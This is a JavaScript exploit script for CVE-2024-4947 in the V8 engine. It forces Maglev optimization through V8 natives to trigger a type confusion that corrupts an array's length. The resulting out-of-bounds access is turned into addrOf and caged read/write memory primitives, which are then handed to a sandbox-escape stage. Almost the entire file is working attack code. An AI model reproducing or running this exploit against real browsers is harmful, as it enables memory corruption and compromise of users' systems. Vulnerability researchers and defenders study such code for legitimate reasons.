import * as ns from "./primitives.mjs";
export let c = 0;

const offsets = init({
    type_shift: 1,
})

function primitives() {
    function to_fast(o) {
        var dummy = {'unique':5};
        dummy.__proto__ = o;
        dummy.__proto__ = o;
    }
    to_fast(ns);

    function store(target, v) {
        target.c = v;
    }

    function createObject() {
        let a = {};
        a.i1 = 1;
        a.i2 = 1;
        a.i3 = 1;
        a.i4 = 1;
        for (let i = 0; i < 8; i++) {
            a[`p${i}`] = 1;
        }
        return a;
    }

    function init() {
        let a = createObject();
        a.__proto__ = ns;
        return a;
    }

    (function() {
         %PrepareFunctionForOptimization(store);
         store(init(), 0);
        
         %OptimizeMaglevOnNextCall(store);
        store(init(), 0);

        for (let x = 0; x < 600; x++)
            store(init(), 0);
    })();

    function confuse_properties_map(arg) {
        store(arg, 0x1 << offsets.type_shift);
    }

    function word_search(haystack, count = 3) {
        // Find `count` consecutive words in a PACKED_DOUBLE_ARRAY
        let last;
        let found = 0;
        for (let x = 20; x < 128; x++) {
            let v = ftoi(haystack[x]);
            let hi = v >> 32n;
            let lo = v & 0xffffffffn

            for (let y of [lo, hi]) {
                if (y == last) {
                    found += 1;
                    if (found == count - 1) {
                        return {index: x, word: y == 0};
                    }
                }
                else {
                    found = 0;
                    last = y;
                }
            }
        }
        throw 'Word search failed';
    }

    function trigger() {

        for (let x = 0; x < 5; x++) {
            let a = init();
            let oobarr = [1.1, 1.1];
            oobarr.push(1.1);
            let objarr = [{}, {}, {}];
            let crwarr = [1.1, 1.2, 1.3];
            confuse_properties_map(a);
            mark_sweep_gc();
            mark_sweep_gc();


            a.p5 = 1024;
            a.p7 = 1024;

            if (oobarr.length != 1024) {
                throw 'Browser not vulnerable';
            }

            // Find the oobarr index of objarr[2]
            objarr[0] = crwarr;
            objarr[1] = crwarr;
            objarr[2] = crwarr;
            let objarr_element2_index;
            try {
                objarr_element2_index = word_search(oobarr).index;

                // Check that we have found the correct pattern
                let old = oobarr[objarr_element2_index];
                objarr[2] = oobarr;
                if (oobarr[objarr_element2_index] == old)
                    throw 'False positive';                
            }
            catch (e) {
                console.log(e);
                continue;
            }
            return {oobarr, objarr, crwarr, objarr_element2_index}
        }

        throw 'Unable to trigger vulnerability';
    }

    let {oobarr, objarr, crwarr, objarr_element2_index} = trigger();

    function addrOf(obj) {
        objarr[2] = obj;
        return ftoi(oobarr[objarr_element2_index]) & 0xffffffffn;
    }

    let oobarr_addr = addrOf(oobarr);
    let crwarr_addr = addrOf(crwarr);
    let crwarr_index = Number((crwarr_addr - oobarr_addr - 24n) / 8n); // -24 is JSArray header length + FixedDoubleArray header length

    return {
        addrOf,
        cagedRead: (addr) => {
            let old = oobarr[crwarr_index + 1];
            oobarr[crwarr_index + 1] = itof(0x00000000600000000n | (addr - 8n) | 1n);
            let r = ftoi(crwarr[0]);
            oobarr[crwarr_index + 1] = old;
            return r;
        },
        cagedWrite: (addr, value) => {
            let old = oobarr[crwarr_index + 1];
            oobarr[crwarr_index + 1] = itof(0x00000000600000000n | (addr - 8n) | 1n);
            crwarr[0] = itof(value);
            oobarr[crwarr_index + 1] = old;
        }
    }
}

async function main() {
    await console.log('Attempting CVE-2024-4947');
    try {

        let p = primitives();
        v8sandbox(p);    
    }
    catch(e) {
        console.log(e.stack || e);
    }
}

main();

